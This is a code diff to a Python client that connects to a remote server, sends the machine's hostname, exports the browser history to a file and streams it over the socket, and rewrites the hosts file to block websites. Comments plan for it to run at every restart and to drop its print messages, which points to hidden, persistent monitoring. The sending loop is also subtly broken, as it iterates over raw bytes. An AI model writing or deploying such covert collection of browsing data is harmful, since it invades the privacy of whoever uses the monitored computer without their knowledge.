@@ -1,25 +1,37 @@
-import socket
+import socket,os,time
 import browserhistory as bh
 from datetime import datetime as dt
-import time
+
 
 linux_host = '/etc/hosts'
 window_host = r"C:\Windows\System32\drivers\etc\hosts"
 default_folder = window_host 
 redirect = "127.0.0.1"
 
-class Client():#To do :always on - turns on restart
+class Client():#To do :always on - turns on restart, all print() wiil be deleted
     def __init__(self, port=8810, ip="0.0.0.0"):
         self.s = socket.socket()
         self.s.connect((ip,port))
-        print("connected")# to be deleted     
+        print("connected")    
+    
+    def run(self):
+        self.first_message()
     
     def first_message(self):
         self.s.send(f"name%{socket.gethostname()}".encode())
         
     def info(self):
-        for line in open("my.csv"):
-            self.s.send(line)
+        self.s.send("history".encode())   
+        bh.write_browserhistory_csv()
+        f = open("chrome_history", "rb")
+        print ("Sending Data ....")
+        l = f.read()
+        while True:      
+            for line in l:
+                self.s.send(line)    
+            break
+        f.close()
+        print("Sending Complete")
             
     def block_websites(self, start_hour , end_hour):
         while True:
